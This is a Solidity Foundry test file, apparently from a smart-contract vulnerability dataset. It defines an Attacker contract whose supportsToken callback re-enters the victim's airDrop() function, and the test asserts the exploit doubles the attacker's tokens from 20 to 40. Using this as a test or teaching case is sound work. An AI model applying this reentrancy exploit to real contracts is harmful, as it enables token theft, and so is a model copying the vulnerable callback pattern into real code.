
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // No fuzzing needed for this specific attack since it doesn't involve ETH values

        // --- 2. State Configuration (Pre-Condition) ---
        // No special state needed - attacker starts with 0 balance

        // --- 3. Funding ---
        // No ETH funding needed for this attack

        // --- 4. Trigger Attack ---
        _attacker.attack();

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertEq(_contractUnderTest.tokenBalance(address(_attacker)), 40, "Attacker should have 40 tokens instead of 20");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    ModifierEntrancy public victim;
    bool public hasBeenCalled;
    bool public exploitSucceeded;
    uint256 public attackCallCount;

    constructor(address victimAddress) { 
        victim = ModifierEntrancy(victimAddress);
        hasBeenCalled = false;
        exploitSucceeded = false;
        attackCallCount = 0;
    }

    function supportsToken() external returns(bytes32) {
        attackCallCount++;
        if(!hasBeenCalled && attackCallCount <= 2) {
            hasBeenCalled = true;
            victim.airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }

    function attack() public {
        uint256 initialBalance = victim.tokenBalance(address(this));
        require(initialBalance == 0, "Should start with 0 balance");
        
        victim.airDrop();
        
        uint256 finalBalance = victim.tokenBalance(address(this));
        if (finalBalance == 40) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {}

    fallback() external payable {}
}
